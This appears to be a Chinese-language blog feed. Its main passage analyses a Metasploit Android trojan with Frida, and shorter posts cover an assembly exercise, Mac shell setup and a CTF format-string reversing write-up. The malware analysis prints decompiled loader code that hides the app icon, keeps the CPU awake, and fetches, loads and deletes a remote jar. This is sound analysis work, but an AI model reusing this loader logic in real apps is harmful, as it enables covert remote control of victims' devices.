v0, <span class="number">0x200</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">v0_1</span> <span class="operator">=</span> v0 + <span class="number">0x204</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">v8</span> <span class="operator">=</span> (<span class="type">long</span>)b.change_endian(arg11, v0_1);</span><br><span class="line">            v4.b = b.timestamp * v8;</span><br><span class="line">            <span class="type">int</span> <span class="variable">v0_2</span> <span class="operator">=</span> v0_1 + <span class="number">4</span>;</span><br><span class="line">            <span class="type">long</span> <span class="variable">v8_1</span> <span class="operator">=</span> (<span class="type">long</span>)b.change_endian(arg11, v0_2);</span><br><span class="line">            v4.c = b.timestamp * v8_1;</span><br><span class="line">            v0 = v0_2 + <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span>(v4.a.startsWith(<span class="string">&quot;http&quot;</span>)) &#123;</span><br><span class="line">                b.encode(arg11, v0, <span class="number">0x80</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v0_3</span> <span class="operator">=</span> v0 + <span class="number">0x80</span>;</span><br><span class="line">                b.encode(arg11, v0_3, <span class="number">0x40</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v0_4</span> <span class="operator">=</span> v0_3 + <span class="number">0x40</span>;</span><br><span class="line">                b.encode(arg11, v0_4, <span class="number">0x40</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v0_5</span> <span class="operator">=</span> v0_4 + <span class="number">0x40</span>;</span><br><span class="line">                v4.d = b.encode(arg11, v0_5, <span class="number">0x100</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v0_6</span> <span class="operator">=</span> v0_5 + <span class="number">0x100</span>;</span><br><span class="line">                v4.e = <span class="literal">null</span>;</span><br><span class="line">                <span class="type">byte</span>[] v5 = b.copy_array(arg11, v0_6, <span class="number">20</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">v2</span> <span class="operator">=</span> v0_6 + <span class="number">20</span>;</span><br><span class="line">                <span class="type">int</span> v0_7;</span><br><span class="line">                <span class="keyword">for</span>(v0_7 = <span class="number">0</span>; v0_7 &lt; v5.length; ++v0_7) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v5[v0_7] != <span class="number">0</span>) &#123;</span><br><span class="line">                        v4.e = v5;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">v5_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                <span class="type">int</span> v0_8;</span><br><span class="line">                <span class="keyword">for</span>(v0_8 = v2; v0_8 &lt; arg11.length; ++v0_8) &#123;</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">v7</span> <span class="operator">=</span> arg11[v0_8];</span><br><span class="line">                    <span class="keyword">if</span>(v7 == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    v5_1.append(((<span class="type">char</span>)(v7 &amp; <span class="number">0xFF</span>)));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">v0_9</span> <span class="operator">=</span> v5_1.toString();</span><br><span class="line">                v4.f = v0_9;</span><br><span class="line">                v0 = v0_9.length() + v2;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            v3.d.add(v4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">encode</span><span class="params">(<span class="type">byte</span>[] arg3, <span class="type">int</span> arg4, <span class="type">int</span> arg5)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] v0 = b.copy_array(arg3, arg4, arg5);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(v0, <span class="string">&quot;ISO-8859-1&quot;</span>).trim();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(UnsupportedEncodingException v1) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(v0).trim();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] copy_array(<span class="type">byte</span>[] arg2, <span class="type">int</span> arg3, <span class="type">int</span> arg4) &#123;</span><br><span class="line">        <span class="type">byte</span>[] v0 = <span class="keyword">new</span> <span class="title class_">byte</span>[arg4];</span><br><span class="line">        System.arraycopy(arg2, arg3, v0, <span class="number">0</span>, arg4);</span><br><span class="line">        <span class="keyword">return</span> v0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里重载函数比较多，可以直接拿脚本批量打印一下看，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">logInf</span>(<span class="params">classs</span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.metasploit.stage.b&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> modifiers = classs.<span class="title function_">getModifiers</span>();</span><br><span class="line">        classs.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Modifier</span>.<span class="title function_">isStatic</span>(modifiers)) &#123;</span><br><span class="line">            <span class="comment">// 静态字段</span></span><br><span class="line">            <span class="keyword">var</span> value = classs.<span class="title function_">get</span>(<span class="literal">null</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(classs + <span class="string">&quot; =&gt;&quot;</span>  + value)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="variable language_">console</span>.<span class="title function_">log</span>(classs)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getAllsonClass</span>(<span class="params">classs</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;查询到子类  =&gt;&quot;</span> + classs.<span class="title function_">getName</span>())</span><br><span class="line">    <span class="title function_">hookClass</span>(<span class="title class_">String</span>(classs.<span class="title function_">getName</span>()))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> thisclass = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//&quot;java.security.MessageDigest&quot;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookClass</span>(<span class="params">CLASS</span>)&#123;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> classStudent = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="variable constant_">CLASS</span>);</span><br><span class="line">    <span class="keyword">var</span> classs = classStudent.<span class="property">class</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//获取所有内部类</span></span><br><span class="line">    <span class="keyword">var</span> innerClasses = classs.<span class="title function_">getDeclaredClasses</span>();</span><br><span class="line">    <span class="keyword">if</span>(innerClasses.<span class="property">length</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        innerClasses.<span class="title function_">forEach</span>(getAllsonClass);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===========&quot;</span> + classs + <span class="string">&quot;中的所有变量==============&quot;</span>)</span><br><span class="line">    <span class="comment">//输出所有变量</span></span><br><span class="line">    classs.<span class="title function_">getDeclaredFields</span>().<span class="title function_">forEach</span>(logInf)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===========&quot;</span> + classs +  <span class="string">&quot;的所有方法==============&quot;</span>)</span><br><span class="line">    <span class="comment">//输出所有方法,并hook</span></span><br><span class="line">    classs.<span class="title function_">getDeclaredMethods</span>().<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">method</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(method)</span><br><span class="line">       <span class="keyword">var</span> methodsName = method.<span class="title function_">getName</span>();</span><br><span class="line">       <span class="keyword">var</span> overloads  = classStudent[methodsName].<span class="property">overloads</span>;</span><br><span class="line">    <span class="comment">//    console.log(overloads.length)</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt; overloads.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            overloads[i].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;进入&quot;</span> + classs.<span class="title function_">getName</span>() + <span class="string">&quot;类的&quot;</span> + methodsName + <span class="string">&quot;方法&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>; j&lt;<span class="variable language_">arguments</span>.<span class="property">length</span>; j++)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;参数&quot;</span> + j + <span class="string">&quot; =&gt; &quot;</span> + <span class="variable language_">arguments</span>[j])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;该函数无参数&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>[methodsName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;结果是 =&gt; &quot;</span> + result)</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">hookClass</span>(<span class="string">&quot;com.metasploit.stage.b&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;没有找到该类&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure>
<p>可以看到两个比较关键的结果：</p>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424154214031.png" alt="image-20240424154214031"></p>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424154229414.png" alt="image-20240424154229414"></p>
<p>即，这里的 payload 就是 msf 马生成的信息部分，在 b 函数中还原出信息并添加生成一个 http request 包</p>
<h6 id="payload-2"><a class="markdownIt-Anchor" href="#payload-2">#</a> payload</h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((v6.a &amp; <span class="number">4</span>) != <span class="number">0</span> &amp;&amp; Payload.b != <span class="literal">null</span>) &#123;</span><br><span class="line">    PowerManager.<span class="type">WakeLock</span> <span class="variable">v0</span> <span class="operator">=</span> ((PowerManager)Payload.b.getSystemService(<span class="string">&quot;power&quot;</span>)).newWakeLock(<span class="number">1</span>, Payload.class.getSimpleName());</span><br><span class="line">    v0.acquire();</span><br><span class="line">    v1 = v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里创建了一个  <code>WakeLock</code>  对象  <code>v0</code> ，它允许应用程序保持设备唤醒状态，这里通过  <code>Payload.b.getSystemService(&quot;power&quot;)</code>  获取了系统服务  <code>power</code> ，并将其转换为  <code>PowerManager</code>  对象。然后调用  <code>newWakeLock(1, Payload.class.getSimpleName())</code>  方法创建了一个  <code>WakeLock</code>  对象，参数  <code>1</code>  表示创建的  <code>WakeLock</code>  类型是  <code>PARTIAL_WAKE_LOCK</code> ，即部分唤醒锁定，它允许 CPU 继续运行，但允许屏幕和其他系统资源关闭。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(Payload.b != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> Payload.b.getPackageName();</span><br><span class="line">        <span class="type">PackageManager</span> <span class="variable">v2</span> <span class="operator">=</span> Payload.b.getPackageManager();</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.MAIN&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        v0.addCategory(<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Object v0_1: v2.queryIntentActivities(v0, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="type">ResolveInfo</span> <span class="variable">v0_2</span> <span class="operator">=</span> (ResolveInfo)v0_1;</span><br><span class="line">            <span class="keyword">if</span>(!v1.equals(v0_2.activityInfo.packageName)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v2.setComponentEnabledSetting(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(v1, v0_2.activityInfo.name), <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>实现了禁用启动器图标，与上文 callback 可以隐匿在后台刷新</li>
</ul>
<p>下面一段是进行基础的 tcp 解包，不需要讲，后面可以直接抓包看行为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">a</span><span class="params">(DataInputStream arg11, OutputStream arg12, Object[] arg13)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(Payload.e == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> (String)arg13[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> v0 + File.separatorChar + Integer.toString(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">0x7FFFFFFF</span>), <span class="number">36</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> v1 + <span class="string">&quot;.jar&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Payload.a(arg11));</span><br><span class="line">        <span class="type">byte</span>[] v4 = Payload.a(arg11);</span><br><span class="line">        <span class="type">File</span> <span class="variable">v5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(v2);</span><br><span class="line">        <span class="keyword">if</span>(!v5.exists()) &#123;</span><br><span class="line">            v5.createNewFile();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">v6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(v5);</span><br><span class="line">        v6.write(v4);</span><br><span class="line">        v6.flush();</span><br><span class="line">        v6.close();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">v0_1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(v2, v0, v0, Payload.class.getClassLoader()).loadClass(v3);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">v2_1</span> <span class="operator">=</span> v0_1.newInstance();</span><br><span class="line">        v5.delete();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">File</span>(v1 + <span class="string">&quot;.dex&quot;</span>).delete();</span><br><span class="line">        v0_1.getMethod(<span class="string">&quot;start&quot;</span>, DataInputStream.class, OutputStream.class, Object[].class).invoke(v2_1, arg11, arg12, arg13);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Payload.class.getClassLoader().loadClass(Payload.e).getConstructor(DataInputStream.class, OutputStream.class, Object[].class, Boolean.TYPE).newInstance(arg11, arg12, arg13, Boolean.valueOf(<span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Payload.c = -<span class="number">1L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里很明显动态生成了文件，并反射运行其中的部分内容，相同的方法抓取方法返回值和参数，可以拿到：</p>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424161446827.png" alt="image-20240424161446827"></p>
<p>反射运行了这个方法，这里仍旧是一个 loader</p>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424160834420.png" alt="image-20240424160834420"></p>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424160846551.png" alt="image-20240424160846551"></p>
<p>那么这里就需要获得里面的 <code>met.jar</code> ，有点缺乏经验不知道怎么搞（这里需要清楚，frida 去 hook 的是 app 内所有的内容，即使 loader 加载的也不例外），不过询问了一下可以去 hook  <code>File.delete</code> ，然后去找文件</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">setImmediate</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;lld [*]&quot;</span>);</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> myClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.io.File&quot;</span>);</span><br><span class="line">        myClass.<span class="property">delete</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="comment">// var ret = this.onStartCommand();</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;delete hooked&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424190256641.png" alt="image-20240424190256641"></p>
<p>这 frida 确实有点好用的</p>
<h5 id="metjar"><a class="markdownIt-Anchor" href="#metjar">#</a> met.jar</h5>
<p>根据刚才的分析，入口类就是这里的 <code>com.metasploit.meterpreter.AndroidMeterpreter</code></p>
<p><img loading="lazy" data-src="msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424191136119.png" alt="image-20240424191136119"></p>
<p>里面的马已经相当明文，就暂时不看了</p>
]]></content>
  </entry>
  <entry>
    <title>pwnCollege</title>
    <url>/2024/02/26/pwnCollege/</url>
    <content><![CDATA[<h6 id="隐藏了~"><a class="markdownIt-Anchor" href="#隐藏了~">#</a> 隐藏了～</h6>
<span id="more"></span>
<p>assembly crash course level 26</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    cmp $4, %rdi               # Compare rdi with 3</span><br><span class="line">    ja default_case            # If rdi &gt; 3, jump to default case</span><br><span class="line"></span><br><span class="line">    # Calculate jump address based on rdi value</span><br><span class="line">    lea (%rsi,%rdi,8), %rax    # rax = rsi + rdi*8 (address in jump table)</span><br><span class="line">    jmp (%rax)                # Indirect jump to the address stored at rax</span><br><span class="line"></span><br><span class="line">default_case:</span><br><span class="line">    lea 32(%rsi), %rax    # rax = rsi + rdi*8 (address in jump table)</span><br><span class="line">    jmp (%rax)                    # Jump to the default case address</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>mac环境配置</title>
    <url>/2023/11/29/mac%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h6 id="preface"><a class="markdownIt-Anchor" href="#preface">#</a> PREFACE：</h6>
<h6 id="qios调试环境怎么搞"><a class="markdownIt-Anchor" href="#qios调试环境怎么搞">#</a> Q：ios 调试环境怎么搞？</h6>
<h6 id="a买台mac"><a class="markdownIt-Anchor" href="#a买台mac">#</a> A：买台 mac</h6>
<span id="more"></span>
<p><a href="https://zhuanlan.zhihu.com/p/441676276">zsh 安装与配置：9 步打造高效命令行 - 知乎 (zhihu.com)</a></p>
<ul>
<li><a href="https://brew.sh/">Homebrew — The Missing Package Manager for macOS (or Linux)</a> 安装命令行</li>
</ul>
<blockquote>
<p>/bin/bash -c “$(curl -fsSL <a href="https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh">https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh</a>)”</p>
</blockquote>
<ul>
<li>环境变量：</li>
</ul>
<blockquote>
<p>echo “export PATH=/opt/homebrew/bin:$PATH” &gt;&gt; ~/.zshrc</p>
</blockquote>
<ul>
<li>安装</li>
</ul>
<blockquote>
<p>brew install</p>
</blockquote>
<ul>
<li>zsh 命令行</li>
</ul>
<blockquote>
<p>brew install zsh</p>
</blockquote>
<ul>
<li>oh-my-zsh</li>
</ul>
<blockquote>
<p>sh -c “$(curl -fsSL <a href="https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh">https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh</a>)”</p>
</blockquote>
<ul>
<li>zsh-autosuggestions 命令行提示插件</li>
</ul>
<blockquote>
<p>git clone <a href="https://github.com/zsh-users/zsh-autosuggestions">https://github.com/zsh-users/zsh-autosuggestions</a> ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions</p>
</blockquote>
<p>在  <code>.zshrc</code>  中，把  <code>zsh-autosuggestions</code>  加入插件列表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">    # other plugins...</span><br><span class="line">    zsh-autosuggestions  # 插件之间使用空格隔开</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<ul>
<li>zsh-syntax-highlighting 命令语法校验</li>
</ul>
<blockquote>
<p>git clone <a href="https://github.com/zsh-users/zsh-syntax-highlighting.git">https://github.com/zsh-users/zsh-syntax-highlighting.git</a> ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting</p>
</blockquote>
<p>在 .zshrc 中，把  <code>zsh-syntax-highlighting</code>  加入插件列表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">    # other plugins...</span><br><span class="line">    zsh-autosuggestions</span><br><span class="line">    zsh-syntax-highlighting</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<ul>
<li>传输文件</li>
</ul>
<blockquote>
<p>python -m http.server</p>
</blockquote>
<ul>
<li>远程 ida</li>
</ul>
<blockquote>
<p>把权限开了运行 macos 那个 arm server 局域网远程就行</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>print占位符重写初探</title>
    <url>/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface-brics题目都太高手了只有这个shellcode是也许能做的可惜没有ios设备动调不了的话并没有把握出这个题"><a class="markdownIt-Anchor" href="#preface-brics题目都太高手了只有这个shellcode是也许能做的可惜没有ios设备动调不了的话并没有把握出这个题">#</a> PREFACE: BRICS 题目都太高手了，只有这个 shellcode 是也许能做的，可惜没有 ios 设备，动调不了的话并没有把握出这个题</h6>
<span id="more"></span>
<h3 id="shellcode"><a class="markdownIt-Anchor" href="#shellcode">#</a> shellcode</h3>
<p>main 里面只有这个，如果不调会以为它真的输出一个环境作为版本号？</p>
<p><img loading="lazy" data-src="print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927081520710.png" alt="image-20230927081520710"></p>
<p>实际上，其他全在 init_array 里面</p>
<p><img loading="lazy" data-src="print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927081242134.png" alt="image-20230927081242134"></p>
<p>随便搜搜可以找到这个：</p>
<p><img loading="lazy" data-src="print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927081346303.png" alt="image-20230927081346303"></p>
<p>也就是说，main 里面会触发这个：</p>
<p><img loading="lazy" data-src="print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927081803593.png" alt="image-20230927081803593"></p>
<p><img loading="lazy" data-src="print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927081816418.png" alt="image-20230927081816418"></p>
<p>至此，信息就比较清晰了：</p>
<p>main 调用 <code>f</code>  占位符重写的函数，在这里会先 <code>scanf</code>  一个任意字符串，和一个操作数</p>
<p>接着触发 print，可以在上面的任意字符串中构造占位符，将需要的 flag 读入，具体的读入需求可以找到；</p>
<p><img loading="lazy" data-src="print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082133233.png" alt="image-20230927082133233"></p>
<p>这个 check 函数，并且它的占位符是 R：</p>
<p><img loading="lazy" data-src="print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082216693.png" alt="image-20230927082216693"></p>
<p>也就是每轮的这个位置会 check 一次</p>
<p>即我们需要调用一个占位符重写函数把 flag 先写到 bss 段里面，翻找以后只有这个，对于的占位符是 <code>p</code></p>
<p><img loading="lazy" data-src="print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082259489.png" alt="image-20230927082259489"></p>
<p><img loading="lazy" data-src="print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082322860.png" alt="image-20230927082322860"></p>
<p>那么可以猜测，我们需要对应 flag 的位数传入 <code>%p</code> ，再输入 flag 存到它的模拟栈上</p>
<p>根据这些占位符，可以大概找一下流程：</p>
<p><img loading="lazy" data-src="print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082606541.png" alt="image-20230927082606541"></p>
<p>即：</p>
<p><img loading="lazy" data-src="print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082617079.png" alt="image-20230927082617079"></p>
<p>大概逻辑是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x ** <span class="number">2</span> - y ** <span class="number">3</span> - num1 = num2</span><br></pre></td></tr></table></figure>
<p>然后爆破求解就行</p>
<p>本来或许以为到这里就快出了？</p>
<p>那么为啥讨厌 ios 呢，调不起来，然后仔细一看发现</p>
<p><img loading="lazy" data-src="print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082853386.png" alt="image-20230927082853386"></p>
<p>这里十个占位符只有三个注册的有参函数却传入了七个值…</p>
<p>那既然不能动调去直接看，那先自己写个程序测测呗，反正结束了慢慢学</p>
